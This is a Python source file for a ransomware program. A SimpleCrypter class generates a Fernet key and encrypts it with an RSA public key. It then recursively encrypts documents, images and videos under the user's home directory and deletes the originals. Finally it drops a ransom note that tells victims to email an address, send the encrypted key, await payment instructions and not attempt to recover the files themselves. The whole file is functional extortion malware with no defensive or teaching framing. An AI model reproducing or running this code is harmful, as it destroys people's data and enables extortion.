from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
import os
from utils import iterator, get_script_directory, get_home_directory


class SimpleCrypter:
    def __init__(self):
        self.key = None
        self.crypter = None
        self.public_key = None
        self.file_exts = ['txt', 'doc', 'pdf', 'jpg', 'png', 'mp4', 'mov', 'docx']
        self.exclude_dirs = [os.path.abspath('keys'), get_script_directory()]

    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def encrypt_fernet_key(self):
        with open('keys/public_key.pem', 'rb') as f:
            self.public_key = serialization.load_pem_public_key(f.read())
        encrypted_key = self.public_key.encrypt(
            self.key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        with open('keys/encrypted_fernet_key.bin', 'wb') as f:
            f.write(encrypted_key)

    def crypt_file(self, file_path, encrypt=True):
        try:
            with open(file_path, 'rb') as file:
                data = file.read()

            if encrypt:
                _data = self.crypter.encrypt(data)
                new_file_path = file_path + '.encrypted'
            else:
                _data = self.crypter.decrypt(data)
                new_file_path = file_path[:-10]  # Remove '.encrypted'

            with open(new_file_path, 'wb') as file:
                file.write(_data)

            if encrypt:
                os.remove(file_path)

            print(f"{'Encrypted' if encrypt else 'Decrypted'}: {file_path}")
        except Exception as e:
            print(f"Error processing {file_path}: {e}")

    def should_encrypt(self, file_path):
        for dir in self.exclude_dirs:
            if file_path.startswith(dir):
                return False

        file_name = os.path.basename(file_path)
        if file_name.startswith('.') or file_name.startswith('~'):
            return False

        return file_path.split('.')[-1] in self.file_exts

    def crypt_system(self, encrypt=True):
        system_root = get_home_directory()

        files_to_encrypt = iterator(system_root, exclude_dirs=self.exclude_dirs, allowed_extensions=self.file_exts)

        for file_path in files_to_encrypt:
            if encrypt:
                if not file_path.endswith('.encrypted'):
                    self.crypt_file(file_path, encrypt=True)
            else:
                if file_path.endswith('.encrypted'):
                    self.crypt_file(file_path, encrypt=False)

    def create_instruction_file(self):
        instruction = """
      Your files have been encrypted.
      To decrypt them, follow these instructions:
      1. Contact us at decrypt@example.com
      2. Send the 'encrypted_fernet_key.bin' file to us
      3. Wait for instructions for payment and decryption
      DO NOT attempt to decrypt the files yourself as this may cause permanent data loss.
      """
        with open('INSTRUCTIONS.txt', 'w') as f:
            f.write(instruction)


def main():
    crypter = SimpleCrypter()
    crypter.generate_key()
    crypter.encrypt_fernet_key()
    crypter.crypt_system(encrypt=True)
    crypter.create_instruction_file()


if __name__ == '__main__':
    main()